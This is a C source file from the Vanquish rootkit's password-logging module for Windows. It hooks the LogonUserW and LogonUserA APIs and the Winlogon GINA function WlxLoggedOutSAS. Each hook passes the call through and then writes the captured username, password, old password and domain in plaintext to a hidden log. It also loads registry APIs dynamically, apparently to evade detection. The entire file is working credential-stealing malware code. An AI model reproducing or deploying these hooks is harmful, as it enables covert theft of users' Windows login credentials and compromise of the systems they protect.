/******************************************************************************\

	Vanquish DLL PwdLog - Copyright (c)2003-2005 XShadow, All rights reserved.

	This program is free software; you can redistribute it but not modify
	it under the terms of license.txt file that came with this package

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
	license for more details.

\******************************************************************************/

#include "vPwdLog.h"
#include "..\Utils.h"
#include "..\Injector.h"

#define DEF_GINAW L"MSGINA.DLL"

#include "vHideReg.h"
EXTERN_MODULE(ADVAPI32);
EXTERN_HIDEREG

DECLARE_PWDLOG

void WINAPI Vanquish_GetGina()
{
	LPVOID lpszGinaKey = L"Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon";
	LPVOID lpszGinaValue = L"GinaDLL";
	LPVOID lpszGinaX = (LPVOID)lpszGina;

	HKEY hKey;
	HKEY hHLM = HKEY_LOCAL_MACHINE;
	LONG retValue;
	DWORD dwBufSize;

	//WARNING! Please remember to check if ADVAPI32 is present! (dynamic implementation)
	if (MODULE_UPDATEFLAG(ADVAPI32) != UPDATEFLAG)
		goto cleanup;

	//load needed functions dinamically (all of Vanquish should be built this way ;)
	JUSTLOAD_API(RegOpenKeyExW, ADVAPI32);
	JUSTLOAD_API(RegQueryValueExW, ADVAPI32);
	JUSTLOAD_API(RegCloseKey, ADVAPI32);

	//equivalent to: retValue = RegOpenKeyExW(hHLM, (LPWSTR)lpszGinaKey, 0, KEY_QUERY_VALUE, &hKey);
	SIMPLE_PARG(hKey);
	SIMPLE_ARG(KEY_QUERY_VALUE);
	SIMPLE_ARG(0);
	SIMPLE_ARG(lpszGinaKey);
	SIMPLE_ARG(hHLM);
	SIMPLE_CALL(RegOpenKeyExW);

	if (retValue != ERROR_SUCCESS) goto cleanup;

	dwBufSize = sizeof(lpszGina);

	//equivalent to: retValue = RegQueryValueExW(hKey, (LPWSTR)lpszGinaValue, NULL, NULL, (LPBYTE)lpszGina, &dwBufSize);
	SIMPLE_PARG(dwBufSize);
	SIMPLE_ARG(lpszGinaX);
	SIMPLE_ARG(NULL);
	SIMPLE_ARG(NULL);
	SIMPLE_ARG(lpszGinaValue);
	SIMPLE_ARG(hKey);
	SIMPLE_CALL(RegQueryValueExW);

	if (retValue != ERROR_SUCCESS) goto cleanup;
	goto wend;
cleanup:
	lstrcpyW(lpszGina, DEF_GINAW);
wend:
	//equivalent to: RegCloseKey(hKey);
	SIMPLE_ARG(hKey);
	SIMPLE_CALL(RegCloseKey);
}

NEWAPI
BOOL
WINAPI
VLogonUserW(
    LPWSTR lpszUsername,
    LPWSTR lpszDomain,
    LPWSTR lpszPassword,
    DWORD dwLogonType,
    DWORD dwLogonProvider,
    PHANDLE phToken
    )
{
	BOOL retValue = FALSE;

	//do api thing
	RESTORE_API(LogonUserW);
	OLDCALL(LogonUserW, 6);
	REPLACE_API(LogonUserW);

	//if all went well we have a user and password
	VRTWriteLog(FALSE, 0, NULL,
		">>>LogonUserW interception; Login %s\r\n"
		"###Username:%S\r\n"
		"###Password:%S\r\n"
		"###Domain:%S\r\n",
		(retValue) ? "OK" : "FAILED",
		lpszUsername,
		lpszPassword,
		lpszDomain
		);

	return retValue;
}

NEWAPI
WINAPI
VLogonUserA(
    LPSTR lpszUsername,
    LPSTR lpszDomain,
    LPSTR lpszPassword,
    DWORD dwLogonType,
    DWORD dwLogonProvider,
    PHANDLE phToken
    )
{
	BOOL retValue = FALSE;

	//do api thing
	RESTORE_API(LogonUserA);
	OLDCALL(LogonUserA, 6);
	REPLACE_API(LogonUserA);

	//if all went well we have a user and password
	VRTWriteLog(FALSE, 0, NULL,
		">>>LogonUserA interception; Login %s\r\n"
		"###Username:%s\r\n"
		"###Password:%s\r\n"
		"###Domain:%s\r\n",
		(retValue) ? "OK" : "FAILED",
		lpszUsername,
		lpszPassword,
		lpszDomain
		);

	return retValue;
}

NEWAPI
int
WINAPI
VWlxLoggedOutSAS(
    PVOID           pWlxContext,
    DWORD           dwSasType,
    PLUID           pAuthenticationId,
    PSID            pLogonSid,
    PDWORD          pdwOptions,
    PHANDLE         phToken,
    PWLX_MPR_NOTIFY_INFO    pMprNotifyInfo,
    PVOID           *pProfile)
{
	int retValue = WLX_SAS_ACTION_NONE;

	RESTORE_API(WlxLoggedOutSAS);
	OLDCALL(WlxLoggedOutSAS, 8);
	REPLACE_API(WlxLoggedOutSAS);

	VRTWriteLog(FALSE, 0, NULL,
		">>>WlxLoggedOutSAS interception; Login %s\r\n"
		"###Username:%S\r\n"
		"###Password:%S\r\n"
		"###OldPassword:%S\r\n"
		"###Domain:%S\r\n",
		(retValue == WLX_SAS_ACTION_LOGON) ? "OK" : "FAILED",
		pMprNotifyInfo->pszUserName,
		pMprNotifyInfo->pszPassword,
		pMprNotifyInfo->pszOldPassword,
		pMprNotifyInfo->pszDomain
		);

	return retValue;
}
